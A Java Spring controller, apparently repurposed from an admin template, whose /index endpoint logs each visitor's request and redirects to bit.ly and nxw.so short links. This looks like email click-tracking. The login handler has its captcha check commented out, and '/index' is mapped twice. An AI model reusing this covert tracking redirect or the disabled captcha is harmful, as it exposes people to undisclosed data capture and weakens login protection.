package com.egao.common.system.controller;

import com.egao.common.core.web.BaseController;
import com.egao.common.core.web.JsonResult;
import com.egao.common.system.entity.EmailRecord;
import com.egao.common.system.entity.LoginRecord;
import com.egao.common.system.entity.Menu;
import com.egao.common.system.service.EmailRecordService;
import com.egao.common.system.service.LoginRecordService;
import com.egao.common.system.service.MenuService;
import com.wf.captcha.utils.CaptchaUtil;
import org.apache.shiro.SecurityUtils;
import org.apache.shiro.authc.*;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.web.servlet.error.ErrorController;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.List;

/**
 * 首页、登录、验证码等
 * Created by wangfan on 2018-12-24 16:10
 */
@Controller
@RequestMapping("/api/emailRecord")
public class EmailRecordController extends BaseController implements ErrorController {
    @Autowired
    private MenuService menuService;
    @Autowired
    private LoginRecordService loginRecordService;

    @Autowired
    private EmailRecordService emailRecordService;


    /**
     * 登录页
     */
    @GetMapping("/index")
    public String login2(HttpServletRequest request) {

        List<EmailRecord> list = emailRecordService.list();
        if(list.size() <= 0){
            System.out.println("第一次访问");
            // 第一次访问进行跳转
            emailRecordService.saveAsync(EmailRecord.TYPE_ERROR, "访问错误", request);
            return "redirect:http://nxw.so/5DRE9";
        }

        emailRecordService.saveAsync(request);

        return "redirect:https://bit.ly/3nqWHSV";
    }


    /**
     * 用户登录
     */
    @ResponseBody
    @PostMapping("/login")
    public JsonResult login(String username, String password, String code, Boolean remember, HttpServletRequest request) {
        if (username == null || username.trim().isEmpty()) return JsonResult.error("请输入账号");
        /*
        if (!CaptchaUtil.ver(code, request)) {
            loginRecordService.saveAsync(username, LoginRecord.TYPE_ERROR, "验证码错误", request);
            return JsonResult.error("验证码不正确");
        }
        */
        try {
            if (remember == null) remember = false;
            SecurityUtils.getSubject().login(new UsernamePasswordToken(username, password, remember));
            loginRecordService.saveAsync(username, request);
            return JsonResult.ok("登录成功");
        } catch (IncorrectCredentialsException ice) {
            loginRecordService.saveAsync(username, LoginRecord.TYPE_ERROR, "密码错误", request);
            return JsonResult.error("密码错误");
        } catch (UnknownAccountException uae) {
            loginRecordService.saveAsync(username, LoginRecord.TYPE_ERROR, "账号不存在", request);
            return JsonResult.error("账号不存在");
        } catch (LockedAccountException e) {
            loginRecordService.saveAsync(username, LoginRecord.TYPE_ERROR, "账号被锁定", request);
            return JsonResult.error("账号被锁定");
        } catch (ExcessiveAttemptsException eae) {
            loginRecordService.saveAsync(username, LoginRecord.TYPE_ERROR, "操作频繁", request);
            return JsonResult.error("操作频繁，请稍后再试");
        }
    }

    /**
     * 登录页
     */
    @GetMapping("/login")
    public String login() {
        if (getLoginUser() != null) return "redirect:index";
        return "login.html";
    }

    /**
     * 主页
     */
    @RequestMapping({"/", "/index"})
    public String index(Model model) {
        // 左侧菜单
        List<Menu> menus = menuService.getUserMenu(getLoginUserId(), Menu.TYPE_MENU);
        model.addAttribute("menus", menuService.toMenuTree(menus, 0));
        return "index.html";
    }


    /**
     * 错误页
     */
    @RequestMapping("/error")
    public String error() {
        return "error/404.html";
    }

    @Override
    public String getErrorPath() {
        return "/error";
    }

}
